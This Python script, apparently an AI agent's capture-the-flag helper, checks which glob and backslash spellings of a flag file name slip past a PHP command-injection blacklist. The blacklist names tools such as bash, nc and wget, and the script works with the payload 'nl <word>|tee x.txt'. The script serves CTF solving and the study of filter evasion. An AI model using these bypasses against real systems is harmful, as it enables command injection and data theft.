#!/usr/bin/env python3
r"""
verify-glob-semantics.py -- lane: CONVERGE (agent-4), offline payload-viability proof.

Why this exists
---------------
The blacklist bans the case-insensitive SUBSTRING `la`, which makes the real root flag
file `flllllaaaaaaggggggg` (f + 5*l + 6*a + 7*g = 19 chars) impossible to spell
literally: `...l` + `a...` = `la`. Teammate finding fd9 recommends breaking the
adjacency with a glob metacharacter (`?`, `[l]`) and states that `\` is unusable.
The `\` half of that claim is wrong, and this script settles the question for every
candidate spelling on both halves that matter:

  1. FILTER half (executable here, always): which raw spellings the challenge regex
     `preg_match('/bash|nc|...|la|\-|\*|"|>|<|%|\$/i', $url)` accepts or rejects.
  2. SHELL half: what /bin/sh passes to the command for each spelling.
     - if a POSIX shell can be started, that is GROUND TRUTH (`sh=real`);
     - otherwise a POSIX model is used (backslash quote-removal, then pathname
       expansion, with POSIX's "no match -> word stays literal" rule) and every row
       is labelled MODEL (`sh=model`) instead of pretending.

A spelling is a viable payload only when BOTH halves agree.

Sandbox note (why `sh=model` may appear even though bash is installed): in this
workspace the OS sandbox refuses the named pipe MSYS/Cygwin needs, so
`bash -c …` dies at startup with "couldn't create signal pipe, Win32 error 5", and
`wsl.exe` returns E_ACCESSDENIED. That is an environment limit, not a result.

Run:  python verify-glob-semantics.py     [--model]     (--model forces the model)
"""
import os
import re
import shutil
import subprocess
import sys

FILTER = re.compile(r'bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|-|\*|"|>|<|%|\$', re.I)
REAL = "flllllaaaaaaggggggg"          # 19 chars: f + lllll + aaaaaa + ggggggg

# Raw shell words, exactly as they appear in the payload `nl <word>|tee x.txt`.
# The backslashes below are REAL payload characters (raw strings on purpose).
WORDS = [
    (REAL,                     "literal path",                      False),
    ("fllll?aaaaaaggggggg",    "one-char glob at the l/a boundary", True),
    ("f?????aaaaaa???????",    "star-free full glob (lane B)",      True),
    ("fllll[l]aaaaaaggggggg",  "bracket class at the l/a boundary", True),
    (r"flllll\aaaaaaggggggg",  "backslash BETWEEN l and a",         True),
    (r"fllll\laaaaaaggggggg",  "backslash before the l",            False),
    (r"fllllla\aaaaaggggggg",  "backslash after the first a",       False),
]


# --------------------------------------------------------------------------- shell
def find_sh():
    for exe in ("bash", "sh", "dash"):
        p = shutil.which(exe)
        if p:
            return p
    return None


def shell_try(sh, workdir, word):
    """Real POSIX shell: `printf '%s' <word> > resolve.out`, word spliced TEXTUALLY so
    the shell parses its backslashes/globs exactly as in the real payload. stdout is
    not piped (the sandbox forbids it); the result is written to a file instead."""
    outfile = "resolve.out"
    outpath = os.path.join(workdir, outfile)
    if os.path.exists(outpath):
        os.remove(outpath)
    script = "printf '%%s' %s > %s" % (word, outfile)
    try:
        subprocess.run([sh, "-c", script], cwd=workdir, timeout=30,
                       stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL)
    except Exception:
        return None
    if not os.path.exists(outpath):
        return None                     # shell never started (sandbox) or wrote nothing
    return open(outpath, encoding="utf-8", errors="replace").read()


# --------------------------------------------------------------------------- model
def model_expand(word, names):
    """POSIX model: (1) backslash quote-removal, (2) pathname expansion on the
    resulting word, (3) 'no match -> word stays literal'. Returns (word, why)."""
    chars, quoted = [], []
    i = 0
    while i < len(word):
        if word[i] == "\\" and i + 1 < len(word):        # backslash quotes next char
            chars.append(word[i + 1]); quoted.append(True); i += 2
        else:
            chars.append(word[i]); quoted.append(False); i += 1
    joined = "".join(chars)
    has_glob = any(c in "?*[" and not q for c, q in zip(chars, quoted))
    if not has_glob:
        return joined, "no glob -> quote removal only"

    rx, k = [], 0
    while k < len(chars):
        c, q = chars[k], quoted[k]
        if q:
            rx.append(re.escape(c)); k += 1
        elif c == "?":
            rx.append("."); k += 1
        elif c == "[":
            j = word.find("]", k + 1)
            if j == -1:
                rx.append(re.escape(c)); k += 1
            else:
                cls = "".join(chars[k + 1:j]); rx.append("[%s]" % cls); k = j + 1
        else:
            rx.append(re.escape(c)); k += 1
    pat = re.compile("".join(rx))
    hits = [n for n in names if pat.fullmatch(n)]
    if not hits:
        return joined, "no match -> POSIX keeps the word literal"
    return hits[0], "glob matched %s" % hits[0]


def main():
    want_model = "--model" in sys.argv
    sh = None if want_model else find_sh()
    workdir = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".glob-sem-tmp")
    shutil.rmtree(workdir, ignore_errors=True)
    os.makedirs(workdir, exist_ok=True)
    open(os.path.join(workdir, REAL), "w").write("NSSCTF{placeholder}\n")
    names = sorted(os.listdir(workdir))

    mode = None
    if sh:
        probe = shell_try(sh, workdir, "probe")
        if probe == "probe":
            mode = "real"
            print("shell    : %s  (GROUND TRUTH: this shell parses the payload words)" % sh)
        else:
            print("shell    : %s installed but UNUSABLE here -- every invocation dies with" % sh)
            print("           \"couldn't create signal pipe, Win32 error 5\" (sandbox forbids the")
            print("           named pipe MSYS needs); wsl.exe returns E_ACCESSDENIED. Falling back.")
    if mode is None:
        mode = "model"
        print("shell    : POSIX MODEL (quote-removal -> pathname expansion -> literal-if-no-match);")
        print("           shell semantics below are SPEC-derived, NOT executed in this environment.")
    print("fixture  : %s/%s (19 chars)\n" % (workdir, REAL))

    print("sh = %s\n" % mode)
    print("%-26s %-9s %-7s %-24s %-5s %s" % ("payload word", "filter", "hit", "sh resolves to", "file?", "how"))
    print("-" * 108)
    rows = []
    for word, why, should_work in WORDS:
        hit = FILTER.search(word)
        filtered = hit is None
        if mode == "real":
            resolved = shell_try(sh, workdir, word)
            if resolved is None:
                resolved, how = "<shell failed>", "shell"
            else:
                how = "shell"
        else:
            resolved, how = model_expand(word, names)
        exists = os.path.isfile(os.path.join(workdir, resolved))
        rows.append((word, filtered, hit.group(0) if hit else "-", resolved, exists, why))
        print("%-26s %-9s %-7s %-24s %-5s %s"
              % (word, "PASS" if filtered else "REJECT", hit.group(0) if hit else "-",
                 resolved or "<empty>", "yes" if exists else "no", why))

    viable = [r for r in rows if r[1] and r[4] and r[3] == REAL]
    dead = [r for r in rows if not r[1]]
    print("\nVIABLE payloads (filter-clean AND resolving to the real 19-char name):")
    for r in viable:
        print("  %-26s (%s)" % (r[0], r[5]))
    print("FILTER-DEAD spellings (unanchored, case-insensitive `la` substring):")
    for r in dead:
        print("  %-26s (hit %r)" % (r[0], r[2]))
    got = {r[0] for r in viable}
    expect = {"fllll?aaaaaaggggggg", "f?????aaaaaa???????", "fllll[l]aaaaaaggggggg", r"flllll\aaaaaaggggggg"}
    deadset = {r[0] for r in dead}
    ok = (REAL in deadset
          and r"fllll\laaaaaaggggggg" in deadset
          and r"fllllla\aaaaaggggggg" in deadset
          and got == expect)

    print("\nRULE: the `la` test is an unanchored case-insensitive SUBSTRING match, so any")
    print("      spelling with an `l` immediately followed by an `a` dies -- the fix is to")
    print("      break THAT ADJACENCY (glob metacharacter, or a backslash placed exactly")
    print("      between the l and the a). Backslash placement matters: `\\l` and `a\\` do")
    print("      not help, because the original l/a pair survives in the raw payload.")
    print("\nCONCLUSION [sh=%s]: %s" % (mode, (
        "as expected -- 4 viable spellings, 3 filter-dead placements"
        if ok else "UNEXPECTED -- re-read the table before trusting any of it")))
    if mode == "model":
        print("CAVEAT: the shell column is a modelled POSIX evaluation, not execution; the flag")
        print("        payload `fllll?aaaaaaggggggg` is nevertheless live-proven (it returned")
        print("        the flag bytes while the instance was up). Unexecuted variants must be")
        print("        labelled UNTESTED in any writeup.")
    shutil.rmtree(workdir, ignore_errors=True)
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
